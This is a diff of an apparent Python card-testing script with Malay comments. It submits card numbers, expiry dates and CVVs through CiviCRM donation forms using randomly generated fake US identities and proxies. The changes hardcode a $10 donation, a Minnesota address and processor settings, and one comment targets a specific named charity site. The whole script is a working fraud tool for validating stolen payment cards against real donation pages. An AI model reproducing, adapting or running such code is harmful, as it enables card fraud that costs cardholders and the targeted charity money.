@@ -49,28 +49,20 @@ def generate_random_user_data():
     first_names = ["John", "Sarah", "Michael", "Emily", "David", "Jessica", "James", "Lauren", "Robert", "Maria", "William", "Jennifer", "Richard", "Linda", "Joseph", "Patricia"]
     last_names = ["Smith", "Johnson", "Brown", "Taylor", "Wilson", "Davis", "Clark", "Harris", "Miller", "Moore", "Anderson", "Thomas", "Jackson", "White", "Martin"]
     email_domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "aol.com", "icloud.com"]
-    city_state_zip = [
-        ["New York", "New York", "10001", "1000"], ["Los Angeles", "California", "90001", "1004"],
-        ["Chicago", "Illinois", "60601", "1012"], ["Houston", "Texas", "77001", "1042"],
-        ["Phoenix", "Arizona", "85001", "1002"], ["Philadelphia", "Pennsylvania", "19101", "1043"],
-        ["San Antonio", "Texas", "78201", "1042"], ["San Diego", "California", "92101", "1004"],
-        ["Dallas", "Texas", "75201", "1042"], ["San Jose", "California", "95101", "1004"],
-    ]
-    street_names = ["Main St", "Oak Ave", "Elm St", "Maple Dr", "Cedar Ln", "Pine St", "Washington Ave", "Lake St", "Park Ave", "River Rd"]
     
     first_name = random.choice(first_names)
     last_name = random.choice(last_names)
     middle_name = random.choice(first_names)[0]
     email_prefix = f"{first_name.lower()}{random.randint(1000,9999)}"
     email = f"{email_prefix}@{random.choice(email_domains)}"
-    loc = random.choice(city_state_zip)
-    city, postal_code, state_id = loc[0], loc[2], loc[3]
-    street_address = f"{random.randint(100, 9999)} {random.choice(street_names)}"
-    phone = f"{random.randint(200,999)}-{random.randint(200,999)}-{random.randint(1000,9999)}"
-    username = f"{email_prefix}{random.randint(10,99)}"
-    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
     
-    return {'first_name': first_name, 'last_name': last_name, 'middle_name': middle_name, 'email': email, 'city': city, 'postal_code': postal_code, 'state_id': state_id, 'street_address': street_address, 'phone': phone, 'username': username, 'password': password}
+    # Kita hardcode Minnesota details supaya match dengan State ID 1022
+    city = "Minneapolis"
+    postal_code = f"5540{random.randint(1,9)}"
+    street_address = f"{random.randint(100, 9999)} {random.choice(['Main St', 'Oak Ave', 'Elm St', 'Maple Dr', 'Cedar Ln', 'Pine St'])} Apt {random.randint(10,99)}"
+    phone = f"612-{random.randint(200,999)}-{random.randint(1000,9999)}"
+    
+    return {'first_name': first_name, 'last_name': last_name, 'middle_name': middle_name, 'email': email, 'city': city, 'postal_code': postal_code, 'street_address': street_address, 'phone': phone}
 
 def clean_card_number(ccnum): return re.sub(r'\D', '', ccnum)
 
@@ -228,13 +220,12 @@ def get_form_action_and_payload(session, url, proxy_url):
 def parse_response(html, url):
     soup = BeautifulSoup(html, 'html.parser')
     
-    # Cari semua div status atau alert
+    # Cari div status atau alert
     status_divs = soup.find_all('div', class_=re.compile(r'status|alert|error|messages', re.I))
     for status_div in status_divs:
         error_text = status_div.get_text(separator=' ', strip=True)
         error_text = re.sub(r'\s+', ' ', error_text).strip()
         if error_text and len(error_text) > 3:
-            # Buang ayat generic CiviCRM yang tak penting
             if "Please correct the following errors in the form fields below:" in error_text:
                 error_text = error_text.replace("Please correct the following errors in the form fields below:", "").strip()
             if error_text:
@@ -335,7 +326,7 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
         final_payload[submit_name] = raw_payload.get('_submit_button_value', '1')
 
     if '_detected_payment_processor_id' in raw_payload:
-        proc_id = raw_payload['_detected_payment_processor_id'].get('value', '1')
+        proc_id = raw_payload['_detected_payment_processor_id'].get('value', '4')
         final_payload['payment_processor_id'] = proc_id
 
     price_selected = False
@@ -352,24 +343,18 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
         if 'stripe' in key_lower or 'token' in key_lower or 'paypal' in key_lower: continue
         if field_type in ['submit', 'button', 'image']: continue
 
-        # FIX 1: Untuk price_2, biarkan value asal dari HTML (jangan tukar 25.00)
-        if 'price' in key_lower or 'amount' in key_lower:
-            if not price_selected:
-                # Kalau value asal dia kosong, kita letak 10.00
-                final_payload[key] = current_value if current_value else "10.00"
-                price_selected = True
-            else:
-                final_payload[key] = '0'
-            continue
-
-        # FIX 2: Untuk custom_1, custom_2, biarkan value asal dari HTML
-        if 'custom_' in key_lower or 'selectProduct' in key_lower:
-            final_payload[key] = current_value
-            continue
-
-        # FIX 3: Hidden processor biarkan value asal
+        # HARDCODE PENTING UNTUK SAHARAAA.ORG
         if 'hidden_processor' in key_lower:
-            final_payload[key] = current_value if current_value else "1"
+            final_payload[key] = "1"
+            continue
+            
+        if key == 'price_2':
+            final_payload[key] = "10"
+            price_selected = True
+            continue
+            
+        if key == 'custom_1': # Donation Year
+            final_payload[key] = "2026"
             continue
 
         if field_type == 'radio' or field_type == 'checkbox':
@@ -380,14 +365,18 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
             continue
 
         if field_type == 'select':
-            if 'state' in key_lower or 'province' in key_lower: final_payload[key] = user_data['state_id']
-            elif 'country' in key_lower: final_payload[key] = '1228'
-            elif 'card' in key_lower and 'type' in key_lower: final_payload[key] = scheme
-            elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): final_payload[key] = full_year
-            elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): final_payload[key] = str(input_month)
+            if 'state' in key_lower or 'province' in key_lower: 
+                final_payload[key] = "1022" # Force Minnesota
+            elif 'country' in key_lower: 
+                final_payload[key] = '1228' # Force US
+            elif 'card' in key_lower and 'type' in key_lower: 
+                final_payload[key] = scheme
+            elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): 
+                final_payload[key] = full_year
+            elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): 
+                final_payload[key] = str(input_month)
             else:
-                # Kalau select lain (custom), biarkan value asal
-                final_payload[key] = current_value
+                final_payload[key] = current_value if current_value else (options[0] if options else "")
             continue
 
         if field_type == 'hidden':
@@ -401,11 +390,6 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
         elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): final_payload[key] = str(input_month)
         elif 'card' in key_lower and 'type' in key_lower: final_payload[key] = scheme
         
-        elif 'frequency' in key_lower and 'interval' in key_lower: final_payload[key] = "1"
-        elif 'recur' in key_lower and 'interval' in key_lower: final_payload[key] = "1"
-        elif 'installments' in key_lower: final_payload[key] = "0"
-        elif 'frequency_unit' in key_lower: final_payload[key] = current_value
-        
         elif 'first' in key_lower and 'name' in key_lower: final_payload[key] = user_data['first_name']
         elif 'last' in key_lower and 'name' in key_lower: final_payload[key] = user_data['last_name']
         elif 'middle' in key_lower and 'name' in key_lower: final_payload[key] = user_data['middle_name']
@@ -414,9 +398,6 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
         elif 'city' in key_lower: final_payload[key] = user_data['city']
         elif 'zip' in key_lower or 'postal' in key_lower: final_payload[key] = user_data['postal_code']
         elif 'phone' in key_lower or 'tel' in key_lower or 'mobile' in key_lower: final_payload[key] = user_data['phone']
-        elif 'pass' in key_lower or 'pwd' in key_lower: final_payload[key] = user_data['password']
-        elif 'user' in key_lower or 'login' in key_lower: final_payload[key] = user_data['username']
-        elif 'employer' in key_lower or 'occupation' in key_lower or 'affiliation' in key_lower or 'position' in key_lower or 'profession' in key_lower: final_payload[key] = "Self Employed"
         else:
             if not current_value:
                 continue
@@ -431,19 +412,7 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
     ccnum = clean_card_number(ccnum)
     user_data = generate_random_user_data()
 
-    detected_price = 0.0
-    for key, field_info in raw_payload.items():
-        if not isinstance(field_info, dict): continue
-        key_lower = key.lower()
-        if 'price' in key_lower or 'amount' in key_lower:
-            val = field_info.get('value', '0')
-            try:
-                p = float(val)
-                if p > 0:
-                    detected_price = p
-                    break
-            except:
-                pass
+    detected_price = 10.0 # Hardcode 10.0 sebab kita dah set price_2=10
 
     for attempt in range(3):
         try:
